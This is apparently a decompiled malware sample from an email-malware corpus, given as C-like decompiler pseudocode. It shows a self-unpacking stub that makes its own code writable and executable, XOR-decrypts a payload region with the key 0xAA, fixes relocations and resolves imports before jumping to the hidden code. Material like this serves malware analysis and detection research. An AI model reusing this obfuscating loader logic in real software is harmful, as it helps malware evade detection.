// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0463/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 eax, word32 ebp, word32 esi, word32 edi)
{
fn00401000_entry:
l00401000:
	SHLWAPI.dll!StrStrIA()
	Eq_3 * esi_152 = null
	up32 dwLoc14_16 = 0x000000E8
	Eq_3 * ebx_17 = (Eq_3 *) 0x00000017
	branch eax == 0x00000000 l0040102A
l00401022:
	return
l0040102A:
	branch AddUsersToEncryptedFile(0x00000000, 0x00000000) != 0x00000000 l00401039
l00401038:
	return
l00401039:
	fp->dwFFFFFFEC = 0xFFFFFFFF;
	fp->dwFFFFFFEC = 0xFFFFFFFF;
	word32 eax_55 = AreAllAccessesGranted(0x00000000, 0x00000000)
	branch eax_55 != 0x00000000 l0040104A
l00401047:
	ebx_17 = eax_55 + 0x00000019;
l0040104A:
	fp->dwFFFFFFEC = ebp;
	fp->dwFFFFFFEC = edi;
	VirtualProtect(0x00401000, 0x00003000, 0x00000040, fp - 0x00000018)
	Eq_60 * eax_149 = null
l00401070:
	branch esi_152 != ebx_17 l00401076
l00401074:
	esi_152 = null;
l00401076:
	eax_149->b401678 = esi_152->b404000 ^ eax_149->b401678 ^ 0xAA;
	Eq_3 * esi_100 = esi_152 + 1
	branch esi_100 != ebx_17 l00401094
l00401092:
	esi_100 = null;
l00401094:
	eax_149->b401679 = esi_100->b404000 ^ eax_149->b401679 ^ 0xAA;
	Eq_3 * esi_110 = esi_100 + 1
	branch esi_110 != ebx_17 l004010B2
l004010B0:
	esi_110 = null;
l004010B2:
	eax_149->b40167A = esi_110->b404000 ^ eax_149->b40167A ^ 0xAA;
	Eq_3 * esi_120 = esi_110 + 1
	branch esi_120 != ebx_17 l004010D0
l004010CE:
	esi_120 = null;
l004010D0:
	eax_149->b40167B = esi_120->b404000 ^ eax_149->b40167B ^ 0xAA;
	Eq_3 * esi_130 = esi_120 + 1
	branch esi_130 != ebx_17 l004010EE
l004010EC:
	esi_130 = null;
l004010EE:
	eax_149->b40167C = esi_130->b404000 ^ eax_149->b40167C ^ 0xAA;
	Eq_3 * esi_140 = esi_130 + 1
	branch esi_140 != ebx_17 l0040110C
l0040110A:
	esi_140 = null;
l0040110C:
	eax_149 = eax_149 + 1;
	eax_149->b401677 = esi_140->b404000 ^ eax_149->b40167D ^ 0xAA;
	esi_152 = esi_140 + 1;
	branch eax_149 <u (Eq_60 *) 0x00001440 l00401070
l00401132:
	fp->dwFFFFFFEC = 0x00000000;
	fp->dwFFFFFFEC = 0x00000000;
	Eq_177 * ecx_159 = &globals->t402978
	branch false l004011BB
l00401162:
	Eq_197 eax_339 = ecx_159->dw0004 - 0x00000008 >>u 0x00000001
	Eq_205 * edx_342 = &ecx_159->t0008
	branch eax_339 <= 0x00000000 l004011A6
l00401174:
	Eq_197 ebx_363 = eax_339
l00401180:
	word32 eax_367 = (word32) edx_342->w0000
	branch (eax_367 & 0x0000F000) != 0x00003000 l0040119E
l00401193:
	Eq_322 * eax_379 = (eax_367 & 0x00000FFF) + ecx_159->dw0000
	eax_379->dw4013F8 = eax_379->dw4013F8 + 0xF04013F8;
l0040119E:
	edx_342 = edx_342 + 1;
	ebx_363 = ebx_363 - 0x00000001;
	branch ebx_363 != 0x00000000 l00401180
l004011A6:
	word32 eax_348 = ecx_159->dw0004
	up32 edx_350 = dwLoc14_16 + eax_348
	Eq_216 * ecx_351 = ecx_159 + eax_348
	branch edx_350 <u 0x00000000 l00401162
	word32 eax_355 = ecx_351->dw0004
	up32 edx_357 = edx_350 + eax_355
	ecx_159 = ecx_351 + eax_355;
	dwLoc14_16 = edx_357;
	branch edx_357 <u 0x00000000 l00401162
l004011BB:
	branch globals->dw40217C == 0x00000000 l00401251
	branch globals->dw40217C == 0x00000000 l00401251
	Eq_188 * ebx_186 = &globals->t40216C
	Eq_188 * dwLoc14_187 = &globals->t40216C
	ebx_209 = ebx_186;
	branch globals->dw40217C == 0x00000000 l00401251
l004011D2:
	Eq_188 * ebx_209
	branch LoadLibraryA(ebx_209->dw000C + 0x004013F8) == 0x00000000 l00401244
	branch LoadLibraryA(ebx_209->dw000C + 0x004013F8) == 0x00000000 l00401244
	Eq_252 eax_235 = LoadLibraryA(ebx_209->dw000C + 0x004013F8)
	Eq_252 ecx_237 = eax_235
	branch eax_235 == 0x00000000 l00401244
l004011EB:
	branch ebx_209->ptr0000 != null l004011F4
	branch ebx_209->ptr0000 != null l004011F4
	Eq_279 * ebp_268 = ebx_209->ptr0000
	branch ebp_268 != null l004011F4
l004011F1:
	ebp_268 = ebx_209->ptr0010;
l004011F4:
	Eq_298 eax_274 = ebp_268->u4013F8
	Eq_302 * ebp_275 = &ebp_268->u4013F8
	word32 esi_276 = Mem166[ebx_209 + 0x00000010:word32] + 0x004013F8
	branch eax_274 == 0x00000000 l00401244
l00401203:
	goto l00401209
l00401205:
	ecx_237 = eax_235;
l00401209:
	word32 eax_298
	branch eax_274 >= 0x00000000 l0040121E
l0040120D:
	eax_298 = GetProcAddress(ecx_237, (word32) ebp_275->t0000);
	goto l0040122A
l0040121E:
	eax_298 = GetProcAddress(ecx_237, eax_274.u0);
l0040122A:
	esi_276->dw0000 = eax_298;
	ebp_275 = ebp_275 + 1;
	eax_274 = ebp_275->t0000;
	esi_276 = esi_276 + 1;
	branch eax_274 != 0x00000000 l00401205
l00401240:
	ebx_209 = dwLoc14_187;
l00401244:
	ebx_209 = ebx_209 + 1;
	dwLoc14_187 = ebx_209;
	branch ebx_209->ptr0010 != null l004011D2
l00401251:
	0x00401E58()
	ExitProcess(0x00000000)
fn00401000_exit:
}

